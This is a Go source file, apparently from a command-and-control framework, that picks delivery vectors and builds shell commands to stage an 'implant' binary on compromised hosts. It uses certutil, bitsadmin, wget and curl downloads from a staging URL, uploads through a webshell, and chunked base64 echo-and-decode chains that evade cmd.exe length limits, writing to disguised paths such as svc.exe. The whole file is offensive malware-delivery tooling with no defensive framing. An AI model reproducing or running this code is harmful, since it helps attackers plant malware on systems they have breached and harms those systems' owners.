package c2bridge

import (
	"encoding/base64"
	"fmt"
	"os"
	"strings"
)

// SelectDeliveryVector picks the best vector for a given shell type.
// shellType: "webshell_php", "rce_cmd", "sqli_exec", "ssh"
func SelectDeliveryVector(shellType string) DeliveryVector {
	switch shellType {
	case "webshell_php":
		return DeliveryVector{Type: "webshell_upload", TargetPath: "/var/www/html/svc.exe"}
	case "rce_cmd":
		return DeliveryVector{Type: "echo_b64", TargetPath: `C:\Windows\Temp\svc.exe`}
	case "sqli_exec":
		return DeliveryVector{Type: "echo_b64", TargetPath: `C:\Windows\Temp\svc.exe`}
	case "ssh":
		return DeliveryVector{Type: "wget", TargetPath: "/tmp/svc"}
	default:
		return DeliveryVector{Type: "certutil", TargetPath: `C:\Windows\Temp\svc.exe`}
	}
}

// BuildDeliveryCommand generates the actual shell command to stage the binary.
// Returns the command string to run on the target (or via the webshell).
// binaryPath is the local path to the binary for echo_b64; for other vectors
// it is the filename to use when referencing STAGING_URL.
func BuildDeliveryCommand(vector DeliveryVector, binaryPath string) string {
	const stagingURL = "STAGING_URL"

	targetPath := vector.TargetPath
	if targetPath == "" {
		targetPath = `C:\Windows\Temp\svc.exe`
	}

	switch vector.Type {
	case "echo_b64":
		return buildEchoB64Command(binaryPath, targetPath)

	case "certutil":
		return fmt.Sprintf(
			"certutil -urlcache -split -f %s/implant.exe %s",
			stagingURL, targetPath,
		)

	case "bitsadmin":
		return fmt.Sprintf(
			"bitsadmin /transfer job /download %s/implant.exe %s",
			stagingURL, targetPath,
		)

	case "wget":
		return fmt.Sprintf(
			"wget %s/implant.exe -O %s",
			stagingURL, targetPath,
		)

	case "curl":
		return fmt.Sprintf(
			"curl -s %s/implant.exe -o %s",
			stagingURL, targetPath,
		)

	case "webshell_upload":
		if vector.ShellURL == "" {
			return fmt.Sprintf(`curl -s -X POST -F "file=@%s" WEBSHELL_URL`, binaryPath)
		}
		return fmt.Sprintf(`curl -s -X POST -F "file=@%s" %s`, binaryPath, vector.ShellURL)

	default:
		return fmt.Sprintf("rem unknown delivery vector: %s", vector.Type)
	}
}

// buildEchoB64Command reads binaryPath, base64-encodes the content, and returns
// a multi-echo → certutil -decode chain that stages the binary on the target.
// Windows cmd.exe has a practical line limit of ~8190 chars; chunks of 4096 stay safe.
func buildEchoB64Command(binaryPath, targetPath string) string {
	data, err := os.ReadFile(binaryPath)
	if err != nil {
		return fmt.Sprintf(
			"rem echo_b64: binary not found at %q; place implant at that path and re-run",
			binaryPath,
		)
	}
	encoded := base64.StdEncoding.EncodeToString(data)
	tmp := targetPath + ".b64"
	const chunkSize = 4096

	var sb strings.Builder
	for i := 0; i < len(encoded); i += chunkSize {
		end := i + chunkSize
		if end > len(encoded) {
			end = len(encoded)
		}
		chunk := encoded[i:end]
		if i == 0 {
			fmt.Fprintf(&sb, "echo %s > %s\n", chunk, tmp)
		} else {
			fmt.Fprintf(&sb, "echo %s >> %s\n", chunk, tmp)
		}
	}
	fmt.Fprintf(&sb, "certutil -decode %s %s && del %s", tmp, targetPath, tmp)
	return sb.String()
}
